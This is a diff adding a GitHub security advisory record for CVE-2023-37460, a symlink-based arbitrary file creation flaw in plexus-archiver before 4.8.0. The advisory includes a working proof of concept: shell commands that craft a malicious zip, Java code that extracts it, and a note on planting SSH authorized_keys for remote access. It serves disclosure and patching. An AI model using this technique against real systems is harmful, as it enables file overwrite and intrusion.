@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-wh3p-fphp-9h2m",
+  "modified": "2023-08-03T17:59:29Z",
+  "published": "2023-07-25T17:20:43Z",
+  "aliases": [
+    "CVE-2023-37460"
+  ],
+  "summary": "Arbitrary File Creation in AbstractUnArchiver",
+  "details": "### Summary\n\nUsing AbstractUnArchiver for extracting an archive might lead to an arbitrary file creation and possibly remote code execution.\n\n### Description\nWhen extracting an archive with an entry that already exists in the destination directory as a symbolic link whose target does not exist - the resolveFile() function will return the symlink's source instead of its target, which will pass the verification that ensures the file will not be extracted outside of the destination directory. Later Files.newOutputStream(), that follows symlinks by default,  will actually write the entry's content to the symlink's target.\n\n### Impact\nWhoever uses plexus archiver to extract an untrusted archive is vulnerable to an arbitrary file creation and possibly remote code execution.\n\n### Technical Details\n\nIn [AbstractUnArchiver.java](https://github.com/codehaus-plexus/plexus-archiver/blob/plexus-archiver-4.7.1/src/main/java/org/codehaus/plexus/archiver/AbstractUnArchiver.java#L342):\n```java\nprotected void extractFile( final File srcF, final File dir, final InputStream compressedInputStream, String entryName, final Date entryDate, final boolean isDirectory, final Integer mode, String symlinkDestination, final FileMapper[] fileMappers)\n    throws IOException, ArchiverException\n    {\n        ...\n        // Hmm. Symlinks re-evaluate back to the original file here. Unsure if this is a good thing...\n        final File targetFileName = FileUtils.resolveFile( dir, entryName );\n\n\n        // Make sure that the resolved path of the extracted file doesn't escape the destination directory\n        // getCanonicalFile().toPath() is used instead of getCanonicalPath() (returns String),\n        // because \"/opt/directory\".startsWith(\"/opt/dir\") would return false negative.\n        Path canonicalDirPath = dir.getCanonicalFile().toPath();\n        Path canonicalDestPath = targetFileName.getCanonicalFile().toPath();\n\n\n        if ( !canonicalDestPath.startsWith( canonicalDirPath ) )\n        {\n            throw new ArchiverException( \"Entry is outside of the target directory (\" + entryName + \")\" );\n        }\n\n\n        try\n        {\n            ...\n            if ( !StringUtils.isEmpty( symlinkDestination ) )\n            {\n                SymlinkUtils.createSymbolicLink( targetFileName, new File( symlinkDestination ) );\n            }\n            else if ( isDirectory )\n            {\n                targetFileName.mkdirs();\n            }\n            else\n            {\n                try ( OutputStream out = Files.newOutputStream( targetFileName.toPath() ) )\n                {\n                    IOUtil.copy( compressedInputStream, out );\n                }\n            }\n\n\n            targetFileName.setLastModified( entryDate.getTime() );\n\n\n            if ( !isIgnorePermissions() && mode != null && !isDirectory )\n            {\n                ArchiveEntryUtils.chmod( targetFileName, mode );\n            }\n        }\n        catch ( final FileNotFoundException ex )\n        {\n            getLogger().warn( \"Unable to expand to file \" + targetFileName.getPath() );\n        }\n    }\n```\nWhen given an entry that already exists in dir as a symbolic link whose target does not exist - the symbolic link’s target will be created and the content of the archive’s entry will be written to it.\n\nThat’s because the way FileUtils.resolveFile() works:\n```java\npublic static File resolveFile( final File baseFile, String filename )\n    {\n        ...\n        try\n        {\n            file = file.getCanonicalFile();\n        }\n        catch ( final IOException ioe )\n        {\n            // nop\n        }\n\n\n        return file;\n    }\n```\nFile.getCanonicalFile() (tested with the most recent version of openjdk (22.2) on Unix) will eventually call [JDK_Canonicalize()](https://github.com/openjdk/jdk/blob/jdk-22%2B2/src/java.base/unix/native/libjava/canonicalize_md.c#LL48C1-L68C69):\n```cpp\nJNIEXPORT int\nJDK_Canonicalize(const char *orig, char *out, int len)\n{\n    if (len < PATH_MAX) {\n        errno = EINVAL;\n        return -1;\n    }\n\n    if (strlen(orig) > PATH_MAX) {\n        errno = ENAMETOOLONG;\n        return -1;\n    }\n\n    /* First try realpath() on the entire path */\n    if (realpath(orig, out)) {\n        /* That worked, so return it */\n        collapse(out);\n        return 0;\n    } else {\n        /* Something's bogus in the original path, so remove names from the end\n           until either some subpath works or we run out of names */\n        ...\n```\nrealpath() returns the destination path for a symlink, if this destination exists. But if it doesn’t - \nit will return NULL and we will reach the else’s clause, which will eventually return the path of the symlink itself.\nSo in case the entry is already exists as a symbolic link to a non-existing file - file.getCanonicalFile() will return the absolute path of the symbolic link and this check will pass:\n```java\nPath canonicalDirPath = dir.getCanonicalFile().toPath();\nPath canonicalDestPath = targetFileName.getCanonicalFile().toPath();\n\n\nif ( !canonicalDestPath.startsWith( canonicalDirPath ) )\n{\n    throw new ArchiverException( \"Entry is outside of the target directory (\" + entryName + \")\" );\n}\n```\nLater, the content of the entry will be written to the symbolic link’s destination and by doing so will create the destination file and fill it with the entry’s content.\n\nArbitrary file creation can lead to remote code execution. For example, if there is an SSH server on the victim’s machine and ~/.ssh/authorized_keys does not exist - creating this file and filling it with an attacker's public key will allow the attacker to connect the SSH server without knowing the victim’s password.\n\n### PoC\nWe created a zip as following:\n```bash\n$ ln -s /tmp/target entry1\n$ echo -ne “content” > entry2\n$ zip  --symlinks archive.zip entry1 entry2\n```\nThe following command will change the name of entry2 to entry1:\n```bash\n$ sed -i 's/entry2/entry1/' archive.zip\n```\nWe put archive.zip in /tmp and create a dir for the extracted files:\n```bash\n$ cp archive.zip /tmp\n$ mkdir /tmp/extracted_files\n```\nNext, we wrote a java code that opens archive.zip:\n```java\npackage com.example;\n\nimport java.io.File;\n\nimport org.codehaus.plexus.archiver.zip.ZipUnArchiver;\n\npublic class App \n{\n    public static void main( String[] args )\n    {\n        ZipUnArchiver unArchiver = new ZipUnArchiver(new File(\"/tmp/archive.zip\"));\n        unArchiver.setDestDirectory(new File(\"/tmp/extracted_files\"));\n        unArchiver.extract();        \n    }\n}\n```\nAfter running this java code, we can see that /tmp/target contains the string “content”:\n```\n$ cat /tmp/target\ncontent\n```\nNotice that although we used here a duplicated entry name in the same archive, this attack can be performed also by two different archives - one that contains a symlink and another archive that contains a regular file with the same entry name as the symlink.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "org.codehaus.plexus:plexus-archiver"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.8.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/codehaus-plexus/plexus-archiver/security/advisories/GHSA-wh3p-fphp-9h2m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37460"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/codehaus-plexus/plexus-archiver/commit/54759839fbdf85caf8442076f001d5fd64e0dcb2"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/codehaus-plexus/plexus-archiver"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/codehaus-plexus/plexus-archiver/releases/tag/plexus-archiver-4.8.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-07-25T17:20:43Z",
+    "nvd_published_at": "2023-07-25T20:15:13Z"
+  }
+}
